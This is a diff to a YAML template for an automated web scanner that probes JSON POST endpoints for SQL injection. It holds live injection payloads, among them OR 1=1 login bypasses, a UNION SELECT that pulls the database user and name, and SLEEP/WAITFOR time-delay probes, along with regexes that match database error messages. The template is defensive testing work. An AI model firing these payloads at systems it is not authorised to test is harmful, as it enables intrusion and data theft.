@@ -1,64 +1,81 @@
 id: generic-sqli-post-json
 info:
-  name: SQL Injection (POST/JSON)
-  severity: critical
-  description: Generic SQL injection testing for POST/JSON bodies - detects all types automatically
+  name: SQL Injection (POST/JSON) - Multi-Tier Detection
+  description: SQL injection in JSON POST requests with multi-tier detection
   tags:
     - sqli
     - injection
     - json
     - generic
+    - blind
 
 generic:
   endpoint: "{{sqli_post}}"
   method: POST
   content_type: "application/json"
-  body_template: '{"{{parameter}}": "{{payload}}"}'
-  parameter: "username"
+  body_template: '{"id": "{{payload}}"}'
 
-  payloads:
-    - name: "single_quote"
-      value: "'"
+  # Multi-tier detection for JSON POST SQLi
+  detection_tiers:
+    # Tier 1: PASSIVE - Error-based detection (fast, safe)
+    - tier: passive
+      detection_type: error_based
+      payloads:
+        - "'"
+        - "\""
+        - "')"
+        - "\")"
+        - "1' OR '1'='1"
+        - "1\" OR \"1\"=\"1"
 
-    - name: "or_bypass"
-      value: "' OR '1'='1"
+      matchers:
+        - type: regex
+          condition: or
+          regex:
+            - "SQL syntax.*?near"
+            - "mysql_fetch.*?error"
+            - "Warning.*?mysql_"
+            - "ORA-\\d{5}"
+            - "PostgreSQL.*?ERROR"
+            - "SQLSTATE\\["
+            - "SQLITE_ERROR"
+            - "sqlite3\\.OperationalError"
+            - "incomplete input"
+            - "syntax error"
+            - "unexpected token"
+            - "Unclosed quotation mark"
+            - "Incorrect syntax near"
+          negative: false
 
-    - name: "login_bypass"
-      value: "' OR 1=1-- -"
+    # Tier 2: ACTIVE - Boolean-blind for JSON
+    - tier: active
+      detection_type: boolean_blind
+      baseline_payload: "valid_id"
+      true_payload: "1' AND '1'='1"
+      false_payload: "1' AND '1'='2"
 
-    - name: "union_select"
-      value: "' UNION SELECT NULL,user(),database()-- -"
+      matchers:
+        - type: regex
+          condition: or
+          regex:
+            - "SQL syntax"
+            - "ORA-"
+          negative: true
 
-    - name: "comment_bypass"
-      value: "admin'--"
+    # Tier 3: AGGRESSIVE - Time-based for JSON (causes delays)
+    - tier: aggressive
+      detection_type: time_blind
+      threshold_ms: 3000
+      payloads:
+        - "1' AND SLEEP(3)--"
+        - "1' AND pg_sleep(3)--"
+        - "1; SELECT SLEEP(3)--"
+        - "1' WAITFOR DELAY '00:00:03'--"
 
-    - name: "boolean_or"
-      value: "' OR '1'='1'--"
-
-  matchers:
-    # SQL error messages
-    - type: regex
-      regex:
-        - "SQL syntax.*?near"
-        - "mysql_fetch.*?error"
-        - "Warning.*?mysql_"
-        - "ORA-\\d{5}"
-        - "PostgreSQL.*?ERROR"
-        - "SQLite3::SQLException"
-        - "SQLSTATE\\["
-        - "Unclosed quotation mark"
-        - "Incorrect syntax near"
-
-    # Database function output
-    - type: regex
-      regex:
-        - "@@version\\s*[0-9]"
-        - "version\\(\\)\\s*[0-9]"
-        - "database\\(\\)"
-
-    # Exclude HTML pages
-    - type: word
-      words:
-        - "<!DOCTYPE html"
-        - "<html>"
-      negative: true
+      matchers:
+        - type: regex
+          condition: or
+          regex:
+            - "SQL syntax"
+            - "ORA-"
+          negative: true
